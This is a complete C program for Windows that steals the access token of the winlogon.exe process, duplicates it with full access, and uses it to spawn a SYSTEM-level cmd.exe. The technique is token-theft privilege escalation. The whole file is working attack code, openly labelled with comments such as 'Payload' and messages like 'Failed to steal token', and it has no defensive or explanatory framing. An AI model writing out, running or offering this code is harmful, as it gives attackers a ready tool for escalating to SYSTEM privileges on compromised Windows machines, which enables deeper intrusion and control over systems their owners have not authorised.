#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL GetProcessTokenByName(LPCWSTR targetProcName, HANDLE* outToken) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { .dwSize = sizeof(PROCESSENTRY32W) };

    if (!Process32FirstW(hSnapshot, &pe)) return FALSE;

    do {
        if (_wcsicmp(pe.szExeFile, targetProcName) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (hProcess) {
                HANDLE hToken;
                if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                    *outToken = hToken;
                    CloseHandle(hProcess);
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
                CloseHandle(hProcess);
            }
        }
    } while (Process32NextW(hSnapshot, &pe));

    CloseHandle(hSnapshot);
    return FALSE;
}

int wmain() {
    HANDLE stolenToken = NULL;

    // 🕵️ Target high-privilege process (must be running)
    if (!GetProcessTokenByName(L"winlogon.exe", &stolenToken)) {
        wprintf(L"[!] Failed to steal token\n");
        return 1;
    }

    HANDLE dupToken = NULL;
    if (!DuplicateTokenEx(
            stolenToken,
            TOKEN_ALL_ACCESS,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            &dupToken)) {
        wprintf(L"[!] DuplicateTokenEx failed (%lu)\n", GetLastError());
        CloseHandle(stolenToken);
        return 1;
    }

    // 🧨 Payload
    WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";
    STARTUPINFOW si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessWithTokenW(
            dupToken,
            LOGON_WITH_PROFILE,
            cmd,
            NULL,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi)) {
        wprintf(L"[!] CreateProcessWithTokenW failed (%lu)\n", GetLastError());
        CloseHandle(dupToken);
        CloseHandle(stolenToken);
        return 1;
    }

    wprintf(L"[+] Spawned elevated cmd.exe!\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(dupToken);
    CloseHandle(stolenToken);
    return 0;
}
